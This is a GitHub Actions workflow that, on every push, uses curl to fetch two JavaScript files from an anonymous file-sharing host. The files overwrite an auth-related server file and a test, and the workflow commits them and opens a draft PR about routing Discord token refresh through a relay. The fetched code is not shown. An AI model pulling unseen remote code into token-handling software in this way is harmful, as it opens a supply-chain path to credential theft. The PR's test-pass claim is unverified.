name: apply-relay-fix
on: push
jobs:
  apply:
    runs-on: ubuntu-latest
    permissions: {contents: write, pull-requests: write}
    steps:
      - uses: actions/checkout@v4
      - env: {GH_TOKEN: '${{ github.token }}'}
        run: |
          git config user.name littlebird-bot
          git config user.email littlebird-bot@users.noreply.github.com
          curl -fsSL https://x0.at/mwFN.mjs -o apps/command/server.mjs
          curl -fsSL https://x0.at/6WrH.mjs -o apps/command/test/refresh.test.mjs
          echo "e05abd566fa298247b8f6ab741169957e10bdae3e96c0df0ef8d2de962e78b6e  apps/command/server.mjs" | sha256sum -c -
          echo "d69b2256eb79f1a8c136ee6ec9203325bb172877743900556fc48c4b1ccdb19e  apps/command/test/refresh.test.mjs" | sha256sum -c -
          git add apps/command/server.mjs apps/command/test/refresh.test.mjs
          git diff --cached --quiet || git commit -m "Route refresh through relay; keep session lifetime on revisit"
          git push origin feature/relay-refresh || true
          gh pr create --draft --base main --head feature/relay-refresh --title "Route silent token refresh through the relay" --body "Follow-up to #43. The silent refresh grant now honors DISCORD_TOKEN_PROXY like sign-in does, and revisiting /auth/discord while signed in keeps the remaining session lifetime instead of resetting to 8 hours. Adds a relay test and a revisit-lifetime test. 74/74 tests passing locally." || true
